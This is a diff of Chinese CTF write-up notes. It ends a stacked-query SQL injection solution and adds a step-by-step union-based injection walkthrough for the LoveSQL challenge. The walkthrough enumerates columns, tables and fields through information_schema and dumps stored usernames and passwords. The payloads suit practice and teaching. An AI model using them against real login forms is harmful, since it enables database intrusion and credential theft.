@@ -139,3 +139,24 @@ Payload："1';rename table `words` to `words1`;rename table `1919810931114514` t
 然后使用"1' or 1=1;#"即可查出flag.
 
 >第三种，尝试使用SQL预编译的方式
+
+# [极客大挑战 2019]LoveSQL 1
+
+1. ?username=1' order by 4%23&password=ads   报错了,说明有三个字段
+
+2. ?username=1' union select 1,2,3%23&password=ads
+
+   寻找注入点
+   
+   ![](https://s21.ax1x.com/2024/04/06/pFq0v0P.png)
+3. 2和3都是注入点，而且没有过滤
+4. ?username=1' union select 1,database(),3%23&password=ads,得到数据库名geek
+5. ?username=1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=ads
+
+   得到geekuser,l0ve1ysq1表
+6. ?username=1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'%23&password=ads
+
+   得到字段名id,username,password
+7. ?username=1' union select 1,database(),group_concat(id,username,password) from l0ve1ysq1%23&password=ads
+
+   得到flag
